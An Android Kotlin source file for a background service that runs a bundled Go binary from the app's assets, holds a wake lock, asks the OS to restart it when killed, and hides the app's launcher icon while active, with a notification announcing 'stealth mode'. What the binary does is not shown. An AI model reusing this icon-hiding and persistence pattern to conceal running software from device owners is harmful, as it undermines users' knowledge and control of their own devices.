package com.inddev.daemon

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import java.io.File
import kotlin.concurrent.thread

class DaemonService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null
    private var goProcess: Process? = null
    private var isRunning = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startForegroundServiceWithNotification()
            acquireWakeLock()
            setAppIconVisibility(visible = false) // UNGU: Sembunyikan ikon launcher saat daemon aktif
            startGolangDaemon()
        }
        return START_STICKY // KUNING: Minta OS bangkitkan ulang service jika di-kill sistem
    }

    private fun startForegroundServiceWithNotification() {
        val channelId = "daemon_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "IndDev Background Daemon",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("IndDev Daemon Active")
            .setContentText("Golangbin system is running in stealth mode...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()

        startForeground(1001, notification)
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "IndDevDaemon::SystemWakeLock"
        ).apply {
            acquire()
        }
    }

    private fun startGolangDaemon() {
        thread {
            try {
                val homeDir = File("/data/data/$packageName/files/home")
                if (!homeDir.exists()) homeDir.mkdirs()

                val binaryFile = AssetExtractor.extractAssetsIfNeeded(this)

                val pb = ProcessBuilder(binaryFile.absolutePath)
                    .directory(homeDir)
                    .redirectErrorStream(true)

                val env = pb.environment()
                env["HOME"] = homeDir.absolutePath
                env["TMPDIR"] = homeDir.absolutePath

                goProcess = pb.start()

                // Stream log
                goProcess?.inputStream?.bufferedReader()?.use { reader ->
                    var line: String?
                    while (reader.readLine().also { line = it } != null) {
                        // Operational log
                    }
                }

                goProcess?.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                stopSelf() // Jika binary crash/berhenti, matikan service agar icon dimunculkan kembali
            }
        }
    }

    private fun setAppIconVisibility(visible: Boolean) {
        val componentName = ComponentName(this, MainActivity::class.java)
        val newState = if (visible) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        } else {
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        }
        packageManager.setComponentEnabledSetting(
            componentName,
            newState,
            PackageManager.DONT_KILL_APP
        )
    }

    override fun onDestroy() {
        goProcess?.destroy()
        wakeLock?.let {
            if (it.isHeld) it.release()
        }
        setAppIconVisibility(visible = true) // UNGU: Kembalikan ikon launcher jika daemon mati
        isRunning = false
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
